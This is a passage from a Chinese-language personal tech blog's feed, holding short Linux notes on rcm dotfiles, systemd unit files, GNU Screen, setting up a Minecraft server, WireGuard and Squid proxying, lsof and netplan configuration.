    <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV1RJ411H7SC/?spm_id_from=333.999.0.0&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">参考 B 站</a></p><p><a href="https://github.com/thoughtbot/rcm">github 文档</a></p><h1 id="Arch-下的安装和使用"><a href="#Arch-下的安装和使用" class="headerlink" title="Arch 下的安装和使用"></a>Arch 下的安装和使用</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>使用 <code>yay</code> 直接安装:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ yay -S rcm-git<br></code></pre></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>四个基本的命令:</p><ul><li><code>mkrc</code>, 将配置文件纳入 <code>rcm</code> 的管理</li><li><code>rcup</code>, 用于还原配置文件</li><li><code>rcdn</code>, 用于删除配置文件的链接文件</li><li><code>lsrc</code>, 列出未打上标签的配置文件</li></ul><p>指定标签都是用 <code>-t</code> 参数.</p><p>首先需要创建 <code>$HOME/.dotfile</code> 目录 (dotfile 就是指配置文件)</p><p>似乎除了点问题, 并没有创建链接, 先不使用.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>如何编写-systemd-unit-file</title>
    <link href="/2022/10/19/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99-systemd-unit-file/"/>
    <url>/2022/10/19/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99-systemd-unit-file/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files">参考1</a></p><p><a href="https://www.suse.com/support/kb/doc/?id=000019672">参考2</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>unit 是 systemd 中的 primary object. 资源是用 unit 文件作为配置文件.</p><h1 id="Unit-Files-的位置"><a href="#Unit-Files-的位置" class="headerlink" title="Unit Files 的位置"></a>Unit Files 的位置</h1><h2 id="lib-systemd-system"><a href="#lib-systemd-system" class="headerlink" title="/lib/systemd/system/"></a><code>/lib/systemd/system/</code></h2><p>默认位于 <code>/lib/systemd/system/</code> 目录下. 软件安装 unit file 就会放到这里. 不该在这个目录下编辑文件, 可以重写文件.</p><h2 id="etc-systemd-system"><a href="#etc-systemd-system" class="headerlink" title="/etc/systemd/system/"></a><code>/etc/systemd/system/</code></h2><p>最好是在 <code>/etc/systemd/system/</code> 目录下编写, 其拥有最高的优先级.</p><p>对于一个 unit, 可以给其创建子目录, 格式为 (如果 unit 叫 <code>example.services</code>): <code>example.services.d</code>, 在子目录下编写 <code>.conf</code> 文件即可. </p><h2 id="run-systemd-system"><a href="#run-systemd-system" class="headerlink" title="/run/systemd/system/"></a><code>/run/systemd/system/</code></h2><p>run-time unit definitions 位于 <code>/run/systemd/system/</code> 其优先级介于 <code>/lib/systemd/system/</code> 和 <code>/etc/systemd/system/</code> 之间.</p><p>任何在其中的修改在重启后都会丢失. 其用于在 runtime 动态创建 unit file.</p><h1 id="Unit-的类型"><a href="#Unit-的类型" class="headerlink" title="Unit 的类型"></a>Unit 的类型</h1><p>参考鸟哥:<br><img src="/../img/unit_file_types.png"></p><p>有一些 unit file 是用来 trigger 其他的 unit.</p><h1 id="Unit-file-解析"><a href="#Unit-file-解析" class="headerlink" title="Unit file 解析"></a>Unit file 解析</h1><p>Unit file 用 sections 来组织, 每一个 section 用 <code>[]</code> 包裹的名称开始.</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Section]</span><br><span class="hljs-attr">Directive1</span>=value<br><span class="hljs-attr">Directive2</span>=value<br></code></pre></td></tr></table></figure><h2 id="General-Characteristics-of-Unit-Files"><a href="#General-Characteristics-of-Unit-Files" class="headerlink" title="General Characteristics of Unit Files"></a>General Characteristics of Unit Files</h2><p>Section 的名称是 well-defined 和 case-sensitive 的.</p><p>如果想添加非标准的 section 来让 <code>systemd</code> 以外的程序使用, 需要在 section name 之前添加 a <code>X-</code> prefix.</p><p>在 section 之中, 通过 key-value 的格式来定义 unit behavior 和 metadata.</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Section]</span><br><span class="hljs-attr">Directive1</span>=value<br><span class="hljs-attr">Directive2</span>=value<br></code></pre></td></tr></table></figure><p>在一个 override file 中想要 reset 一个 directive, 用空字符串给其赋值:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">Directive1</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>一些 boolean 表达:<br>    - 真: 1, yes, on, true<br>    - 假: o, no, off, false</p><h2 id="Unit-Section-的-Directives"><a href="#Unit-Section-的-Directives" class="headerlink" title="[Unit] Section 的 Directives"></a>[Unit] Section 的 Directives</h2><p>第一个 Section 一般是 <code>[Unit]</code>. 用来定义 unit 的一些 metadata 以及配置其和其他 unit 的关系.</p><p>尽管 section 的顺序对于 <code>systemd</code> 来说无关紧要. <code>[Unit]</code> section 一般还是放在 unit file 的顶部.</p><p> 一些常见的 directives:</p><ul><li><code>Description=</code>: 可以用来描述这个 unit 的名称和基本用途</li><li><code>Documentation=</code>: 提供可查阅的 document 的位置, 该值用 <code>systemctl status</code> 可以返回, 如: <code>Documentation=man:systemd.special(7)</code></li><li><code>Requires=</code>: 列出需要依赖的其他 unit, 这些 unit 在默认情况下会被 started in parallel with the current unit</li><li><code>Wants=</code>: 和 <code>Requires=</code> 类似, 但没那么严格, <code>systemd</code> 会尝试启动 any units listed here, 如果没找到或启动失败, 当前 unit 仍然可以工作.</li><li><code>BindsTo=</code>: 和 <code>Requires=</code> 类似, 但在 其他 unit 终止时, 当前 unit 也会停止</li><li><code>Before=</code>: 当前 unit 在其列出的 unit 启动前启动</li><li><code>After=</code>: 在当前 unit 在其列出的 unit 启动后启动</li><li><code>Conflicts=</code>: 列出的 unit 不能和当前 unit 同时运行, 启动其列出的 unit 会导致当前 unit 停止</li><li><code>Condition...=</code>:</li><li><code>Assert...=</code>:</li></ul><h2 id="Install-Section-Directives"><a href="#Install-Section-Directives" class="headerlink" title="[Install] Section Directives"></a>[Install] Section Directives</h2><p>Unit file 的最后一个 section 一般是 <code>[Install]</code> section. 这个 section 是可选的, 用来定义一个 unit 在 enable 之后的行为, enable 即开机自动启动.</p><p>因此, 只有 units that can be enabled 才会有这个 section.</p><p>这个 section 的 directives:</p><ul><li><code>WantedBy=</code>: 表明 how a unit should be enabled. 其允许你像 <code>Wants=</code> 一样指明一个依赖关系, 当拥有这个 directive 的 unit 被 enable 后, 其会在 <code>/etc/systemd/system/</code> 目录下创建一个后缀为 <code>.wants</code> 的目录. 之后会创建一个 symbolic link 到当前文件.</li><li><code>RequiredBy=</code>: 和 <code>WantedBy=</code> 类似, 但在依赖不存在时仍和开启, 会创建 <code>.requires</code> 的目录</li><li><code>Alias=</code>: 允许这个 unit 用另一个名称来 enable</li><li><code>Also=</code>: 允许 unit 作为一个 set 被 enable</li><li><code>DefaultInstance=</code>:</li></ul><h2 id="Unit-specific-Section-Directives"><a href="#Unit-specific-Section-Directives" class="headerlink" title="Unit-specific Section Directives"></a>Unit-specific Section Directives</h2><h3 id="The-Service-Section"><a href="#The-Service-Section" class="headerlink" title="The [Service] Section"></a>The [Service] Section</h3><p>用来提供配置.</p><p>最基本的是设置 <code>Type=</code>, 其有如下选项:</p><ul><li>simple: 设置了之后, service 的主要进程会在 start line 中显示. 当 <code>Type=</code> 和 <code>Busname=</code> 未设置, <code>ExecStart</code> 设置了的时候, 其是默认值.</li><li>forking: 当 service fork 了一个 child process 是使用. 其告诉 <code>systemd</code> 当 parent exit 的时候程序仍然在运行.</li><li>oneshot: 指明进程会 short-lived, 然后 <code>systemd</code> 应该等待进程退出 before continuing on with other units, 其为 <code>Type=</code> 和 <code>ExecStart=</code> 未设置时的默认值</li><li>dbus: 指明 unit will take a name on the D-Bus bus</li><li>notify: 指明 service will issue a notification when it has finished starting up</li><li>idle:</li></ul><p>其他的 directive:</p><ul><li><code>ExecStart=</code>: 指明开启进程的命令的 full path and arguments, 只能指定一个, 如果命令之前 preceded by a dash <code>-</code> character, 会使命令在返回非零值时程序不会停止</li><li><code>ExecStartPre=</code>: 在 mian process 启动之前执行, 可多次使用, 同样, 如果命令之前 preceded by a dash <code>-</code> character, 会使命令在返回非零值时程序不会停止</li><li><code>ExecStartPost=</code>: 之后</li><li><code>ExecReload=</code>: 可选, 指明用来 reload 配置文件的命令</li><li><code>ExecStop=</code>: 用来 stop service 的命令, 如果没有指明, the main process will be killed immediately when the service is stopped</li><li><code>ExecStopPost=</code>: 在 stop command execute 之后执行</li><li><code>RestartSec=</code>: 指明尝试重启前需要等待的时间</li><li><code>Restart=</code>: 可以设置 “always”, “on-success”, “on-failure”, “on-abnormal”, “on-abort”, “on-watchdog” 等</li><li><code>TimeoutSec=</code>: 在你 stop 一个 service 时, <code>systemd</code> 将其标记为 failed 或 forcefully killing 的等待时间.</li></ul><p>其他的参考博文即可.</p><h1 id="从-Template-Unit-Files-创建实例"><a href="#从-Template-Unit-Files-创建实例" class="headerlink" title="从 Template Unit Files 创建实例"></a>从 Template Unit Files 创建实例</h1><h2 id="Template-and-Instance-Unit-Names"><a href="#Template-and-Instance-Unit-Names" class="headerlink" title="Template and Instance Unit Names"></a>Template and Instance Unit Names</h2><p>用 <code>@</code> 标识 Template unit files.</p><p>如: <code>example@.service</code></p><p>当一个 Instance 是从一个 template 创建的, 其 instance identifier 放在 <code>@</code> 和 unit type 之间: <code>example@instance1.service</code></p><p>一个 instance file 常常是 template file 的 symbolic link.</p><h2 id="Template-Specifiers"><a href="#Template-Specifiers" class="headerlink" title="Template Specifiers"></a>Template Specifiers</h2>]]></content>
    
    
    <categories>
      
      <category>Linu</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>GNU-Screen-的使用</title>
    <link href="/2022/10/19/GNU-Screen-%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/19/GNU-Screen-%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/GNU_Screen">参考 ArchWiki</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>GNU Screen 是一个全屏窗口管理器. 其能够在多进程中复用 a physical terminal.</p><p>在 Screen 中运行的 Programs 可以在你 detached 之后持续运行. </p><p>可查阅 <a href="https://www.gnu.org/software/screen/manual/screen.html#Overview">手册</a>.</p><h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>使用快捷键操作. 具体查看 Wiki 和 手册.</p><h2 id="Named-sessions"><a href="#Named-sessions" class="headerlink" title="Named sessions"></a>Named sessions</h2><p>使用 <code>-S</code> 参数:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -S session_name<br></code></pre></td></tr></table></figure><p>列出所有 sessions:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -list<br></code></pre></td></tr></table></figure><p>attach 一个 named screen session:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -x session_name<br></code></pre></td></tr></table></figure><p>或者:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -r session_name<br></code></pre></td></tr></table></figure><h2 id="自定义-Screen"><a href="#自定义-Screen" class="headerlink" title="自定义 Screen"></a>自定义 Screen</h2><p>可以修改 Screen 的默认设置.</p><p>其配置文件为 <code>~/.screenrc</code>.</p><h1 id="开机启动"><a href="#开机启动" class="headerlink" title="开机启动"></a>开机启动</h1><p>利用 <code>systemd</code> 自动启动.</p><p>自动启动特定用户的 service:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ systemctl <span class="hljs-built_in">enable</span> screen@florian<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>我的世界服务器搭建</title>
    <link href="/2022/10/18/%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
    <url>/2022/10/18/%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><a href="https://phoenixnap.com/kb/minecraft-dedicated-server">参考</a></h1><h2 id="1-用-ssh-连接服务器"><a href="#1-用-ssh-连接服务器" class="headerlink" title="1. 用 ssh 连接服务器"></a>1. 用 ssh 连接服务器</h2><h2 id="2-安装-Java"><a href="#2-安装-Java" class="headerlink" title="2. 安装 Java"></a>2. 安装 Java</h2><p>安装最新版的 OpenJDK:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ sudo apt update<br>$ sudo apt install default-jdk<br>$ java -version<br></code></pre></td></tr></table></figure><p>这里是教程中给的下载版本, 实操后报错说版本不够, 因此重新装了一个:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt install openjdk-18-jdk-headless<br></code></pre></td></tr></table></figure><h2 id="3-安装-screen"><a href="#3-安装-screen" class="headerlink" title="3. 安装 screen"></a>3. 安装 screen</h2><p>screen 是保持服务器在你 disconnect 的时候仍然持续运行.</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ apt install screen <br></code></pre></td></tr></table></figure><h2 id="4-创建一个目录"><a href="#4-创建一个目录" class="headerlink" title="4. 创建一个目录"></a>4. 创建一个目录</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mkdir</span> minecraft<br>$ <span class="hljs-built_in">cd</span> minecraft<br></code></pre></td></tr></table></figure><h2 id="5-下载配置文件"><a href="#5-下载配置文件" class="headerlink" title="5. 下载配置文件"></a>5. 下载配置文件</h2><p><a href="https://www.minecraft.net/en-us/download/server">下载页面</a></p><p>使用 <code>wget</code> 下载:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ wget https://piston-data.mojang.com/v1/objects/f69c284232d7c7580bd89a5a4931c3581eae1378/server.jar<br></code></pre></td></tr></table></figure><p>重命名来体现版本:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">mv</span> server.jar minecraft_server.1.19.2.jar<br></code></pre></td></tr></table></figure><p>这里的版本号需自己查看.</p><p>运行:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ java -Xmx1024M -Xms1024M -jar minecraft_server.1.19.2.jar nogui<br></code></pre></td></tr></table></figure><p>如果出现 <code>EULA</code> (End User License Agreement) 报错则下一步.</p><h2 id="6-接受-Minecraft’s-EULA"><a href="#6-接受-Minecraft’s-EULA" class="headerlink" title="6. 接受 Minecraft’s EULA"></a>6. 接受 Minecraft’s EULA</h2><p>在你之前运行了:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ java -Xmx1024M -Xms1024M -jar minecraft_server.1.19.2.jar nogui<br></code></pre></td></tr></table></figure><p>之后, 当前目录会多出几个文件和目录:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p>用文本编辑器打开 <code>eula.txt</code> 这个文件. 这个文件中有一个链接, 能够 takes you to the Minecraft end user license agreement, 查看网页内容后, 若同意, 则修改 <code>eula.txt</code> 中的 <code>eula=false</code> 为 <code>eula=ture</code>.</p><h2 id="7-运行-screen"><a href="#7-运行-screen" class="headerlink" title="7. 运行 screen"></a>7. 运行 screen</h2><p>用 screen 开启一个 session, 添加 <code>-S</code> 选项来命名:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ screen -S <span class="hljs-string">&quot;Minecraft server&quot;</span><br></code></pre></td></tr></table></figure><h2 id="8-运行-Minecraft-Server"><a href="#8-运行-Minecraft-Server" class="headerlink" title="8. 运行 Minecraft Server"></a>8. 运行 Minecraft Server</h2><p>再次运行之前的命令:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ java -Xmx1024M -Xms1024M -jar minecraft_server.1.19.2.jar nogui<br></code></pre></td></tr></table></figure><p>如果得到 <code>Done!</code> 的提示, 则成功运行.</p><p>可通过修改 <code>server.properties</code> 文件设置默认配置.</p><h2 id="9-配置防火墙"><a href="#9-配置防火墙" class="headerlink" title="9. 配置防火墙"></a>9. 配置防火墙</h2><p>Minecraft 默认使用 25565 端口.</p><p>Enable port forwarding for ufw:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ ufw allow 25565<br></code></pre></td></tr></table></figure><p>若使用 iptables 则:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ iptables -I INPUT -p tcp --dport 25565 -j ACCEPT<br>$ iptables-save &gt;/etc/sysconfig/iptables<br></code></pre></td></tr></table></figure><h2 id="10-设置域名"><a href="#10-设置域名" class="headerlink" title="10. 设置域名"></a>10. 设置域名</h2><p><a href="https://phoenixnap.com/kb/what-is-domain-name-system-works">更新 domain’s DNS records 参考</a></p><h1 id="官方教程"><a href="#官方教程" class="headerlink" title="官方教程"></a><a href="https://minecraft.fandom.com/wiki/Tutorials/Setting_up_a_server">官方教程</a></h1><h1 id="B-站教程"><a href="#B-站教程" class="headerlink" title="B 站教程"></a><a href="https://www.bilibili.com/video/BV1pa411G7zy/?is_story_h5=false&p=1&share_from=ugc&share_medium=ipad&share_plat=ios&share_source=COPY&share_tag=s_i&timestamp=1666144523&unique_k=4YJSPJ5&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">B 站教程</a></h1>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>KVM-虚拟机和本机沟通</title>
    <link href="/2022/10/18/KVM-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E6%9C%AC%E6%9C%BA%E6%B2%9F%E9%80%9A/"/>
    <url>/2022/10/18/KVM-%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E6%9C%AC%E6%9C%BA%E6%B2%9F%E9%80%9A/</url>
    
    <content type="html"><![CDATA[<p><a href="https://getlabsdone.com/how-to-connect-kvm-vm-to-host-network/">参考</a></p><p>在部署一个 KVM 虚拟机之后, 其会自动连接一个 default virtual network, acting as a NAT interface. 这样, 虚拟机才能和上网. 但是不能使用 SSH 直接连接. 因为虚拟机相当于在内网.</p><p>需要使用一个 bridge interface for the Local network.</p><h2 id="KVM-中的-bridge-interface"><a href="#KVM-中的-bridge-interface" class="headerlink" title="KVM 中的 bridge interface"></a>KVM 中的 bridge interface</h2>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Fix-Linux-Unsupported-proxy-configured</title>
    <link href="/2022/10/17/Fix-Linux-Unsupported-proxy-configured/"/>
    <url>/2022/10/17/Fix-Linux-Unsupported-proxy-configured/</url>
    
    <content type="html"><![CDATA[<p><a href="https://stackoverflow.com/questions/50236188/linux-unsupported-proxy-configured">参考</a></p><p>使用 <code>export http_proxy=</code> 时, 后面的格式应该如 <code>http://127.0.0.1:8888/</code>:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ <span class="hljs-built_in">export</span> http_proxy=<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>科学上网搭建总结</title>
    <link href="/2022/10/17/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%90%AD%E5%BB%BA%E6%80%BB%E7%BB%93/"/>
    <url>/2022/10/17/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%90%AD%E5%BB%BA%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>主要需要用到:</p><ul><li>境外服务器 (承载 wireguard docker 和 squid 代理服务器)</li><li>wireguard 实现内网穿透 (对于电脑没有公网 IP)</li><li>squid 代理 http 请求 (用来转发请求)</li></ul><h2 id="1-境外服务器"><a href="#1-境外服务器" class="headerlink" title="1. 境外服务器"></a>1. 境外服务器</h2><p>我这里用的是腾讯云的轻量应用服务器, 选的是新加坡的服务器 (香港的售空了), 大概是这个界面:</p><p><img src="/../img/purchase_server.png"></p><p>然后进入自己的控制台:<br><img src="/../img/enter_console.png"></p><p>下方会有自己创建好的服务器:<br><img src="/../img/where_server_is.pmg.png"></p><p>旁边的更多里面有很多选项.</p><h2 id="2-wireguard"><a href="#2-wireguard" class="headerlink" title="2. wireguard"></a>2. wireguard</h2><p>这里使用更为简便的 docker 搭建 wireguard 服务器.</p><p>工具为 wg-easy, 可以在 <a href="https://github.com/WeeJeWel/wg-easy">github</a> 上找到相关页面.</p><p>搭建过程参考 <a href="https://gitee.com/spoto/wireguard">这篇博文</a>, 以及作者在 <a href="https://www.bilibili.com/video/BV1uT411w7Tq/?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=bc8ddbb1a08707dc809c3fd9bb85290d">B 站的教学视频</a>.</p><p>注意要给云服务器本身也添加一个 client, 因为 wireguard 服务器在 docker 上.</p><h2 id="3-squid"><a href="#3-squid" class="headerlink" title="3. squid"></a>3. squid</h2><p>具体参考 &lt;&lt;鸟哥的 Linux 私房菜服务器架设篇&gt;&gt;.</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用-squid-代理时-curl-报错-Connection-reset-by-peer</title>
    <link href="/2022/10/17/%E4%BD%BF%E7%94%A8-squid-%E4%BB%A3%E7%90%86%E6%97%B6-curl-%E6%8A%A5%E9%94%99-Connection-reset-by-peer/"/>
    <url>/2022/10/17/%E4%BD%BF%E7%94%A8-squid-%E4%BB%A3%E7%90%86%E6%97%B6-curl-%E6%8A%A5%E9%94%99-Connection-reset-by-peer/</url>
    
    <content type="html"><![CDATA[<p>将原本的:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> 公网IP:端口<br></code></pre></td></tr></table></figure><p>改为:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> 内网穿透虚拟IP:端口<br></code></pre></td></tr></table></figure><p>就好了.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>启用-wg0-时报错</title>
    <link href="/2022/10/17/%E5%90%AF%E7%94%A8-wg0-%E6%97%B6%E6%8A%A5%E9%94%99/"/>
    <url>/2022/10/17/%E5%90%AF%E7%94%A8-wg0-%E6%97%B6%E6%8A%A5%E9%94%99/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>什么是-NBD-以及如何使用</title>
    <link href="/2022/10/16/%E4%BB%80%E4%B9%88%E6%98%AF-NBD-%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/10/16/%E4%BB%80%E4%B9%88%E6%98%AF-NBD-%E4%BB%A5%E5%8F%8A%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://zhuanlan.zhihu.com/p/50460919">参考</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>NBD 是 Network Block Device 的简称. </p><p>NBD 能让用户通过网络访问到某个块设备, 或者设备镜像.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>查看某个端口被哪一个进程占用</title>
    <link href="/2022/10/16/%E6%9F%A5%E7%9C%8B%E6%9F%90%E4%B8%AA%E7%AB%AF%E5%8F%A3%E8%A2%AB%E5%93%AA%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B%E5%8D%A0%E7%94%A8/"/>
    <url>/2022/10/16/%E6%9F%A5%E7%9C%8B%E6%9F%90%E4%B8%AA%E7%AB%AF%E5%8F%A3%E8%A2%AB%E5%93%AA%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B%E5%8D%A0%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.yisu.com/zixun/311818.html">参考</a><br>使用 <code>lsof</code> (list open file) 命令.</p><p>安装, Arch 中直接安装 <code>sudo pacman -S lsof</code>.</p><p>使用, 如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ lsof -i :80<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于-netplan</title>
    <link href="/2022/10/16/%E5%85%B3%E4%BA%8E-netplan/"/>
    <url>/2022/10/16/%E5%85%B3%E4%BA%8E-netplan/</url>
    
    <content type="html"><![CDATA[<p><a href="https://juejin.cn/post/7139049944903581732">参考</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Netplan 是命令行下的网络配置程序. 其允许用 YAML 来配置网络接口, 可与 NetworkManager 和 systemd-networkd 网络守护进程一起作为内核接口.</p><p>其读取 <code>/etc/netplan/</code> 下的网络描述.</p><p>可在 <code>man netplan</code> 下查看配置文件相关内容.</p><p>参考示例配置:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-attr">network:</span><br><span class="hljs-comment"># 版本号,可以不写</span><br><span class="hljs-attr">version:</span> <span class="hljs-number">2</span> <br><span class="hljs-comment"># 可以不写</span><br><span class="hljs-attr">renderer:</span> <span class="hljs-string">networkd</span><br><span class="hljs-attr">ethernets:</span><br><span class="hljs-attr">ens33:</span>   <span class="hljs-comment">#配置的网卡名称</span><br><span class="hljs-attr">dhcp4:</span> <span class="hljs-literal">no</span>    <span class="hljs-comment">#dhcp4关闭</span><br><span class="hljs-attr">dhcp6:</span> <span class="hljs-literal">no</span>    <span class="hljs-comment">#dhcp6关闭</span><br><span class="hljs-attr">addresses:</span> [<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.55</span><span class="hljs-string">/24</span>]   <span class="hljs-comment">#设置本机IP及掩码</span><br><span class="hljs-attr">gateway4:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.254</span>   <span class="hljs-comment">#设置网关</span><br><span class="hljs-attr">nameservers:</span><br><span class="hljs-attr">addresses:</span> [<span class="hljs-number">114.114</span><span class="hljs-number">.114</span><span class="hljs-number">.114</span>, <span class="hljs-number">8.8</span><span class="hljs-number">.8</span><span class="hljs-number">.8</span>]   <span class="hljs-comment">#设置DNS</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>squid-正向代理</title>
    <link href="/2022/10/16/squid-%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/"/>
    <url>/2022/10/16/squid-%E6%AD%A3%E5%90%91%E4%BB%A3%E7%90%86/</url>
    
